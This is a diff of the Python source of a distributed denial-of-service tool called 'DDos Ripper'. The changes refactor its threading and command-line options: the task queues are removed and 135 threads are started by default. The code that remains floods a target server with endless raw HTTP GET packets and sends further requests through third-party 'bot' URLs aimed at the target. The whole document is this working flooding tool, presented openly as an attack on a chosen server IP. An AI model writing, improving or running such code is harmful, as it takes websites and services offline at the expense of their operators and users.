@@ -2,9 +2,7 @@
 # -*- coding: utf-8 -*-
 
 
-
 import sys
-from queue import Queue
 from optparse import OptionParser
 import time,sys,socket,threading,logging,urllib.request,random
 
@@ -17,8 +15,8 @@ print('''
 ██║  ██║██║  ██║██║   ██║╚════██║    ██╔══██╗██║██╔═══╝ ██╔═══╝ ██╔══╝  ██╔══██╗
 ██████╔╝██████╔╝╚██████╔╝███████║    ██║  ██║██║██║     ██║     ███████╗██║  ██║
 ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝    ╚═╝  ╚═╝╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝                                                              
-                                                              ©EngineRipper
-                                                              reference by Hammer
+                                                             ©EngineRipper
+                                                             reference by Hammer
 ''')
 
 def user_agent():
@@ -39,7 +37,6 @@ def user_agent():
 	return(uagent)
 
 
-
 def my_bots():
 	global bots
 	bots=[]
@@ -57,17 +54,8 @@ def bot_rippering(url):
 	except:
 		time.sleep(.1)
 
-def bot_again_rippering(url):
-	try:
-		while True:
-			req = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': random.choice(uagent)}))
-			print("\033[90magain bot is rippering...\033[0m")
-			time.sleep(.1)
-	except:
-		time.sleep(.2)
 
-
-def down_it(item):
+def down_it():
 	try:
 		while True:
 			packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
@@ -88,22 +76,13 @@ def down_it(item):
 
 def dos():
 	while True:
-		item = q.get()
-		down_it(item)
-		q.task_done()
+		down_it()
 
 
 def dos2():
 	while True:
-		item=w.get()
 		bot_rippering(random.choice(bots)+"http://"+host)
-		w.task_done()
 
-#def dos3():
-  #  while True:
-  #      item = e.get()
-  #      bot_rippering(random.choice(bots)+"http://"+host)
-  #      e.task_done()
 
 def usage():
 	print (''' \033[0;95mDDos Ripper 
@@ -112,7 +91,7 @@ def usage():
 	-s : -server ip
 	-p : -port default 80
 	-q : -quiet
-	-t : -turbo default 135 or 443 \033[0m ''')
+	-t : -threads default 135 \033[0m ''')
 	sys.exit()
 
 
@@ -122,10 +101,10 @@ def get_parameters():
 	global thr
 	global item
 	optp = OptionParser(add_help_option=False,epilog="Rippers")
-	optp.add_option("-s","--server", dest="host",help="attack to server ip -s ip")
-	optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
-	optp.add_option("-t","--turbo",type="int",dest="turbo",help="default 135 or 443 -t 135 or 443")
-	optp.add_option("-h","--help",dest="help",action='store_true',help="help you")
+	optp.add_option("-s","--server", dest="host",help="attack to server ip -s [IP]")
+	optp.add_option("-p","--port",type="int",dest="port",help="-p [PORT] default 80")
+	optp.add_option("-t","--threads",type="int",dest="threads",help="-t [THREADS] default 135")
+	optp.add_option("-h","--help",dest="help",action='store_true',help="help")
 	optp.add_option("-q", "--quiet", help="set logging to ERROR", action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
 	opts, args = optp.parse_args()
 	logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
@@ -140,11 +119,10 @@ def get_parameters():
 	else:
 		port = opts.port
 
-	if opts.turbo is None:
+	if opts.threads is None:
 		thr = 135
 	else:
-		thr = opts.turbo
-
+		thr = opts.threads
 
 
 # reading headers
@@ -152,10 +130,6 @@ global data
 headers = open("headers.txt", "r")
 data = headers.read()
 headers.close()
-#task queue are q,w,e
-q = Queue()
-w = Queue()
-e = Queue()
 
 
 if __name__ == '__main__':
@@ -166,36 +140,22 @@ if __name__ == '__main__':
 	print("\033[94mPlease wait...\033[0m")
 	user_agent()
 	my_bots()
-	time.sleep(5)
+	time.sleep(3)
 	try:
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		s.connect((host,int(port)))
 		s.settimeout(1)
 	except socket.error as e:
-		print("\033[91mcheck server ip and port\033[0m")
+		print("\033[91mCheck server ip and port\033[0m")
 		usage()
+
+	for i in range(int(thr)):
+		t = threading.Thread(target=dos)
+		t.daemon = True
+		t.start()
+		t2 = threading.Thread(target=dos2)
+		t2.daemon = True
+		t2.start()
+
 	while True:
-		for i in range(int(thr)):
-			t = threading.Thread(target=dos)
-			t.daemon = True  # if thread exists, it dies
-			t.start()
-			t2 = threading.Thread(target=dos2)
-			t2.daemon = True  # if thread is exist, it dies
-			t2.start()
-		#	t3 = threading/Thread(target=dos3)
-		#	t3.daemon = True # if thread is exist, it dies
-		#	t3.start()
-		start = time.time()
-		#tasking
-		item = 0
-		while True:
-			if (item>1800): # for no memory crash
-				item=0
-				time.sleep(.1)
-			item = item + 1
-			q.put(item)
-			w.put(item)
-			e.put(item)
-		q.join()
-	w.join()
-e.join()
+		time.sleep(.1)
